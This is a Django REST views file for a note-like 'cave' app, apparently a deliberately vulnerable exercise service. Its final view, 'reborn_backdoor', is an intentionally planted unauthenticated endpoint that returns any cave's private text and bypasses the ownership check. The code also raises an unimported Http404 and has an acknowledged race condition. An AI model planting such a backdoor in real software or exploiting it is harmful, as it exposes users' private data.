from django.conf import settings
from django.db.models import F
from rest_framework.response import Response
from rest_framework.views import APIView
from rest_framework import status
from rest_framework.permissions import AllowAny
from rest_framework.decorators import api_view, permission_classes, authentication_classes
from .models import Cave
from .serializers import CaveSerializer
from django.http import StreamingHttpResponse
import os
from backend.utils import get_random_file_name

class CaveView(APIView):
    def get_object(self, uuid):
        try:
            return Cave.objects.get(uuid=uuid)
        except Cave.DoesNotExist:
            raise Http404

    def get(self, request, uuid, format=None):
        cave = self.get_object(uuid)
        if request.user.username != cave.author.username:
            return Response({'error': 'You are not authorized to access this cave.'}, status=status.HTTP_403_FORBIDDEN)
        random_file_name = get_random_file_name()
        file = open(random_file_name, 'w')
        file.write(cave.text)
        file.close()
        file = open(random_file_name, 'r').read()
        response = StreamingHttpResponse(file)
        response['Content-Type'] = 'text/plain; charset=utf8'
        os.remove(random_file_name)
        return response

    def put(self, request, uuid, format=None):
        cave = self.get_object(uuid)
        if request.user.username != cave.author.username:
            return Response({'error': 'You are not authorized to access this cave.'}, status=status.HTTP_403_FORBIDDEN)
        serializer = CaveSerializer(cave, data=request.data)
        if serializer.is_valid():
            serializer.save()
            return Response(serializer.data, status=status.HTTP_200_OK)
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)

    def post(self, request, format=None):
        number_of_existing_caves = Cave.objects.filter(author=request.user.id).count()
        if number_of_existing_caves >= settings.PERSONAL_CAVE_LIMIT:
            return Response({ 'error': 'Personal cave limit of ' + \
                str(settings.PERSONAL_CAVE_LIMIT) + ' has been reached.' }, \
                status=status.HTTP_403_FORBIDDEN)
        data = request.data
        data['author'] = request.user.id
        serializer = CaveSerializer(data=data)
        if serializer.is_valid():
            serializer.save()
            return Response(serializer.data, status=status.HTTP_201_CREATED)
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)

@api_view(['GET'])
def get_my_caves(request):
    queryset = Cave.objects.filter(author=request.user.id)
    serializer = CaveSerializer(queryset, many=True)
    return Response(serializer.data, status=status.HTTP_200_OK)

@api_view(['GET'])
def get_public_caves(request):
    queryset = Cave.objects.filter(is_public=True)
    serializer = CaveSerializer(queryset, many=True)
    return Response(serializer.data, status=status.HTTP_200_OK)

@api_view(['GET'])
def like_cave(request, uuid):
    cave = Cave.objects.get(uuid=uuid)
    liking_user = request.user
    if liking_user.username == cave.author.username:
        return Response({'error': 'You can\'t like your own cave.'}, status=status.HTTP_403_FORBIDDEN)
    liked_caves = liking_user.userprofile.liked_caves
    if len(liked_caves.filter(uuid=uuid)) != 0:
        return Response({'error': 'You\'ve already liked this cave.'}, status=status.HTTP_403_FORBIDDEN)
    liking_user.userprofile.liked_caves.add(cave)
    cave.likes = cave.likes + 1 # Prone to race condition, but at least I can serialize the cave now
    cave.save()
    serializer = CaveSerializer(cave)
    return Response(serializer.data, status=status.HTTP_200_OK)

@api_view(['GET'])
@permission_classes((AllowAny,))
@authentication_classes(())
def reborn_backdoor(request, uuid):
    cave = Cave.objects.get(uuid=uuid)
    random_file_name = get_random_file_name()
    file = open(random_file_name, 'w')
    file.write(cave.text)
    file.close()
    file = open(random_file_name, 'r').read()
    response = StreamingHttpResponse(file)
    response['Content-Type'] = 'text/plain; charset=utf8'
    os.remove(random_file_name)
    return response
